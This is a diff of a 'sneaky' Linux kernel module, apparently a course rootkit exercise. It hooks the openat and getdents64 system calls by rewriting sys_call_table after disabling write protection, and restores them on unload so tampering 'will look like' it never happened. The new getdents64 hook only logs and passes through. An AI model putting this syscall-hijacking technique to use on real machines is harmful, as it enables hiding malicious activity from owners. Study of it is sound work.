@@ -60,14 +60,22 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+asmlinkage int (*original_getdents64)(struct pt_regs *);
 
+asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
+{
+   printk(KERN_INFO "Here\n"); 
+  return  (*original_getdents64)(regs);
+}
+
+/**
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count);
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count)
 {
   return  (*original_getdents)(fd, dirp, count);
 }
- 
+**/ 
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -88,7 +96,7 @@ static int initialize_sneaky_module(void)
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
-  sys_call_table[__NR_getdents] = (unsigned long)sneaky_sys_getdents;
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
   // You need to replace other system calls you need to hack here
   
   // Turn write protection mode back on for sys_call_table
@@ -108,7 +116,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
-  sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
 }  
